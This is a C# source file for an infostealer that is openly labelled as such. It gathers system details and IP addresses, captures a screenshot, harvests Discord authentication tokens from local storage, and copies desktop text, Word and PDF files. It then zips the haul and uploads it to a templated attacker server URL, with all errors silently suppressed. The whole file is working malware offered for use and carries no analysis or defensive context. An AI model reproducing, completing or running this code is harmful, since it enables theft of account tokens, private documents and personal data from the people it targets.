using System;
using System.IO;
using System.Net;
using System.Text;
using System.Drawing;
using System.Windows.Forms;
using System.IO.Compression;
using System.Net.Http;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

class Program
{
    static string serverUrl = "{{SERVER_URL}}";
    static string tempDir = Path.Combine(Path.GetTempPath(), "NullSecData");

    [STAThread]
    static void Main()
    {
        try
        {
            Directory.CreateDirectory(tempDir);
            File.WriteAllText(Path.Combine(tempDir, "systeminfo.txt"), GetSystemInfo());
            CaptureScreen();
            StealDiscordTokens();
            StealDesktopFiles();

            string zipPath = Path.Combine(Path.GetTempPath(), "data.zip");
            if (File.Exists(zipPath)) File.Delete(zipPath);
            ZipFile.CreateFromDirectory(tempDir, zipPath);
            SendData(zipPath);
        }
        catch { }
    }

    static string GetSystemInfo()
    {
        StringBuilder sb = new StringBuilder();
        sb.AppendLine($"Kullanıcı: {Environment.UserName}");
        sb.AppendLine($"Bilgisayar: {Environment.MachineName}");
        sb.AppendLine($"OS: {Environment.OSVersion}");
        sb.AppendLine($"Local IP: {GetLocalIP()}");
        sb.AppendLine($"Public IP: {GetExternalIP()}");
        return sb.ToString();
    }

    static string GetLocalIP()
    {
        try
        {
            return Dns.GetHostAddresses(Dns.GetHostName())
                      .First(ip => ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                      .ToString();
        }
        catch { return "unknown"; }
    }

    static string GetExternalIP()
    {
        try { return new WebClient().DownloadString("https://api.ipify.org"); }
        catch { return "unknown"; }
    }

    static void CaptureScreen()
    {
        try
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            bmp.Save(Path.Combine(tempDir, "screenshot.jpg"));
        }
        catch { }
    }

    static void StealDiscordTokens()
    {
        string tokenPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Discord\Local Storage\leveldb";
        StringBuilder result = new StringBuilder();

        if (Directory.Exists(tokenPath))
        {
            foreach (string file in Directory.GetFiles(tokenPath, "*.ldb"))
            {
                string content = File.ReadAllText(file);
                if (content.Contains("mfa.")) result.AppendLine(content);
            }
        }

        File.WriteAllText(Path.Combine(tempDir, "discord.txt"), result.ToString());
    }

    static void StealDesktopFiles()
    {
        try
        {
            string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            foreach (string file in Directory.GetFiles(desktop))
            {
                string ext = Path.GetExtension(file).ToLower();
                if (ext == ".txt" || ext == ".docx" || ext == ".pdf")
                {
                    File.Copy(file, Path.Combine(tempDir, Path.GetFileName(file)), true);
                }
            }
        }
        catch { }
    }

    static void SendData(string zipPath)
    {
        try
        {
            using (HttpClient client = new HttpClient())
            {
                var content = new MultipartFormDataContent();
                content.Add(new ByteArrayContent(File.ReadAllBytes(zipPath)), "file", "data.zip");
                client.PostAsync(serverUrl, content).Wait();
            }
        }
        catch { }
    }
}
